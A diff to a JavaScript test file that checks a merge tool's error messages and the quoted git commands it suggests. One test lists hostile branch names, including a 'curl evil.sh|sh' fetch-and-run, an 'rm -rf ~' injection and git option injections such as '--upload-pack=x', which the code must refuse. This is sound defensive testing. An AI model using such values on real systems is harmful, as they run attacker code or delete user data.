@@ -51,6 +51,28 @@ void test('errors use plain copy and keep the raw output for Details', () => {
   });
   assert.equal(prepare.title, 'Gnosis couldn’t prepare this merge.');
   assert.equal(prepare.recovery, 'retry');
+  assert.match(prepare.body, /Nothing was changed\. Try again\. If it fails again, merge on your computer\.$/);
+  assert.equal(prepare.commands, undefined, 'No branches known: no commands');
+  // With the PR's branches, a failed preparation says what to run instead (what happened, why, the next step).
+  const local = describeConflictError('Git could not complete this operation. fatal: bad object', {
+    stage: 'prepare',
+    headRepo: 'klang/engine',
+    baseRepo: 'klang/engine',
+    headBranch: 'feature/retry',
+    baseBranch: 'main',
+  });
+  assert.match(local.body, /in a clone of klang\/engine, run these commands\.$/);
+  assert.equal(local.commands, "git switch -- 'feature/retry'\ngit pull\ngit fetch -- origin 'main'\ngit merge -- 'origin/main'");
+  // A busy PR or GitHub still reading the revisions passes on its own: no local merge offered.
+  const branches = { headRepo: 'klang/engine', baseRepo: 'klang/engine', headBranch: 'feature/retry', baseBranch: 'main' };
+  for (const message of ['A conflict operation is already running for this PR.', 'GitHub has not returned the branch revisions yet.']) {
+    const copy = describeConflictError(message, { stage: 'prepare', ...branches });
+    assert.equal(copy.commands, undefined, message);
+    assert.equal(copy.body, message);
+  }
+  assert.ok(
+    describeConflictError('Resolve conflicts needs Git 2.40 or newer. Install a newer Git, then try again.', { stage: 'prepare', ...branches }).commands
+  );
   assert.equal(
     describeConflictError('Select an unresolved text file.', { stage: 'other' }).title,
     'Select an unresolved text file.'
@@ -61,14 +83,14 @@ void test('local merge commands quote every name, and refuse names a shell could
   const same = { headRepo: 'klang/engine', baseRepo: 'klang/engine', headBranch: 'feature/retry', baseBranch: 'main' };
   assert.equal(
     localMergeCommands(same),
-    "git switch 'feature/retry'\ngit pull\ngit fetch origin 'main'\ngit merge 'origin/main'"
+    "git switch -- 'feature/retry'\ngit pull\ngit fetch -- origin 'main'\ngit merge -- 'origin/main'"
   );
   assert.equal(
     localMergeCommands({ ...same, headRepo: 'ana/engine' }),
-    "git switch 'feature/retry'\ngit pull\ngit fetch 'https://github.com/klang/engine.git' 'main'\ngit merge FETCH_HEAD"
+    "git switch -- 'feature/retry'\ngit pull\ngit fetch -- 'https://github.com/klang/engine.git' 'main'\ngit merge FETCH_HEAD"
   );
   // A branch name from the PR's author that would run code when pasted: no commands at all.
-  for (const headBranch of ['fix$(curl -s evil.sh|sh)', 'fix`id`', "fix';rm -rf ~;'", 'fix branch', 'fix\nrm'])
+  for (const headBranch of ['fix$(curl -s evil.sh|sh)', 'fix`id`', "fix';rm -rf ~;'", 'fix branch', 'fix\nrm', '--upload-pack=x', '-b'])
     assert.equal(localMergeCommands({ ...same, headBranch }), undefined, headBranch);
   assert.equal(localMergeCommands({ ...same, baseRepo: 'klang/engine;id' }), undefined);
   assert.equal(shellQuote("it's"), "'it'\\''s'");
